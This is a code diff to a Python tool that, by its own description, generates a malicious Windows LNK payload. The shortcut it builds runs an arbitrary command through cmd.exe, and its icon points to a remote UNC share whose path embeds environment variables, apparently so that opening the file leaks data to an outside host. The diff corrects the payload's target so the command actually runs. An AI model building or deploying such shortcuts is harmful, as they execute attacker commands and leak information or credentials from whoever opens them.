@@ -1,5 +1,3 @@
-from __future__ import print_function
-
 import argparse
 import os
 import random
@@ -35,7 +33,6 @@ banner = r"""\
 ##                                         |__/       ##
   ~==================================================~
 """
-
 
 def parse_cmd_line_args():
     parser = argparse.ArgumentParser(description='Generate a LNK payload')
@@ -89,7 +86,6 @@ def parse_cmd_line_args():
         """))
     return args
 
-
 def main(args):
     target = ' '.join(args.execute)
 
@@ -99,7 +95,7 @@ def main(args):
             filename=random.randint(0, 50000)
         )
     else:
-        args.vars = args.vars.replace('%', '').split(' ')
+        args.vars = args.vars.replace('%', '').split(',')
         path = '_'.join('%{0}%'.format(w) for w in args.vars)
         # Some minor anti-caching
         icon = r'\\{host}\Share_{path}\{filename}.ico'.format(
@@ -109,10 +105,10 @@ def main(args):
         )
 
     if is_windows:
-        ws = win32com.client.Dispatch('wscript.shell')
+        ws = win32com.client.Dispatch('WScript.Shell')
         link = ws.CreateShortcut(args.output)
-        link.Targetpath = r'C:\Windows\System32'
-        link.Arguments = 'cmd.exe /c ' + target
+        link.Targetpath = r'C:\Windows\System32\cmd.exe'
+        link.Arguments = '/c ' + target
         link.IconLocation = icon
         link.save()
     else:
@@ -122,11 +118,10 @@ def main(args):
         link.target = target
         link.icon = icon
 
-        print('File saved to {}'.format(filepath))
+        print(f'File saved to {filepath}')
         link.save(filepath)
 
-    print('Link created at {} with UNC path {}.'.format(args.output, icon))
-
+    print(f'Link created at {args.output} with UNC path {icon}.')
 
 """
 These functions are helper functions from pylnk that assumed the lnk
@@ -134,7 +129,6 @@ file was for the same OS it was being created on. For our purposes, our
 target is windows only, so I've adjusted them to assume a windows
 target to avoid errors.
 """
-
 
 def for_file(target_file, lnk_name=None):
     lnk = pylnk.create(lnk_name)
@@ -150,7 +144,6 @@ def for_file(target_file, lnk_name=None):
     lnk.shell_item_id_list.items = elements
     return pylnk.from_segment_list(elements, lnk_name)
 
-
 def create_for_path(path, isdir):
     now = datetime.now()
     return {
@@ -161,7 +154,6 @@ def create_for_path(path, isdir):
         'modified': now,
         'name': path.split('\\')[0]
     }
-
 
 if __name__ == '__main__':
     print(banner)
